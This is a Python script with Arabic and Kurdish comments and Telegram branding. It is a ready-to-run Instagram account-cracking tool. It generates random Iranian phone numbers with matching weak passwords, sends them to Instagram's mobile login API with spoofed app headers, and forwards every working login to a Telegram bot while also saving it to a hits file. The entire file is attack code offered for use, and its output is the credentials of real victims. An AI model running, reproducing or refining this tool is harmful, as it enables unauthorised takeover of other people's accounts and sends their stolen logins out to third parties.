#=============(نوسین)===========
try:
	import  os , sys , random, requests , time , json , secrets,uuid
	import subprocess
	from bs4 import BeautifulSoup as Abbas
	from uuid import uuid4
	from time import sleep 
	import webbrowser
except ImportError as hayder:
	os.system('pip install requests')
	os.system('pip install bs4')
#============(ألاوان)=============
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
E = '\033[1;31m' #احمر
webbrowser.open('https://t.me/foxkurd')
#============(لوگو)=============
ali= """ Ali Al-foxkurd

\033[1;31m--------------------------------
\033[1;33m< \033[2;32mMy telegram channel ids tool hayder + Abbas \033[1;33m>
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mTelegram      : @O9645
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mDeveloper     : @ppn90
\033[1;31m--------------------------------
 """
#============(توکینو،ئایدی تلیگرام)============ 
print(ali)
tok = input(Z+"["+F+"⌯"+Z+"]"+X+ " Token TeLe"+Z+" :\n"+B)
ID = input(Z+"["+F+"⌯"+Z+"]"+X+ " ID TeLe"+Z+" :\n"+B)
os.system('clear')

#============(اعدات للصيد)=============
sr = 0
bd = 0
ht = 0
ib = 0
#============(اتصالات وتحكمات )=============
start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\n😎تولەکە فەحس دەکرێت فوکس\n= = = = = = = = = = =\n \n  \n هەر موشکیلەکتان هەبو جات بنێرن بو ئەوانە :@foxkurd اکراد\n : @artin_ryase\n @foxkurd\n= = = = = = = = = = = =\nژمارەی ئەو ئەژمێرانەی کە تۆ دەتەوێت لەم پەنجەرەوە بەدەست بهێنیت [{ht}]✅").json()
id_msg = start_msg['result']['message_id']        
t = time.localtime()
current_time = time.strftime('%H:%M:%S', t)
sleep(2)
w = 'https://pastebin.com/raw/mpWBGQKF'
rss = requests.get(w).text
if '' in rss:
            sleep(0.1)
            r = requests.Session()
            user = '0123456789'
            while True:
                us = str(''.join((random.choice(user) for i in range(7))))
                
                username = '+98913' + us
                password = '0913' + us
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',  'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
                uid = str(uuid4())
                data = {'uuid':uid,  'password':password,  'username':username, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
                req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
                if 'logged_in_user' in req_login.text:
                    ht += 1
                    
                    tlg = (f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= Ali Al-foxkurd
= = = = = = = = = = = = =
.✅.𝒉𝒊𝒕 [ {ht} ] 
.❌.𝒃𝒂𝒅 [ {bd} ] 
.🔐.𝒄𝒆𝒄𝒐𝒓[ {sr} ] 
.🕡.𝒕𝒊𝒎𝒆 [{current_time}]
= = = = = = = = = = = = =
.📧.𝒆𝒎𝒂𝒊𝒍 [ {username} ]
.🙎‍♂.𝒑𝒂𝒔𝒔 [ {password} ]
= = = = = = = = = = = = =
 𝒃𝒚:- @artin_ryase ~ @foxkurd
 
  ''' )
                    i = requests.post(tlg)
                    with open('insta-hits.txt', 'a') as (HACKED):
                        HACKED.write('{}:{}'.format(username, password))
                elif '"message":"challenge_required","challenge"' in req_login.text:
                    ib += 1                
                    sr+=1
                else:
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print (f''' 
{C}
d88888b  .d88b.  db    db 
88'     .8P  Y8. `8b  d8' 
88ooo   88    88  `8bd8'  
88~~~   88    88  .dPYb.  
88      `8b  d8' .8P  Y8. 
YP       `Y88P'  YP    YP 
                          
                          

\033[1;31m--------------------------------
\033[1;33m< \033[2;32mMy telegram channel ids tool Ali Al-Shammari \033[1;33m>
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mTelegram      : @foxkurd الحجي
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mDeveloper     : @artin_ryase
\033[1;31m--------------------------------

          \033[1;33m<\033[2;32m Iran \033[1;33m>                                                                                                                                                                
{E}({X}{username}{E}) {B} ➥ {E}({X}{password}{E})
{E}-------------------------------
{E}({X}➥{E}){X}secure{E} ➥  {X}{sr}
{E}({F}➥{E}){F}Good{E} ➥  {F}{ht}
{E}({B}➥{E}){B}Bad{E} ➥ {B}{bd}
{E}-------------------------------
{X}telegram {E}: {F}@foxkurd
               
                    ''')                    
                    bd+=1
else:		
	ht+=1      
	
	        	
print ('	 تمم صيد حبي')	     
print ('گەر شەرەفت هەیە نای دزی')   	        	
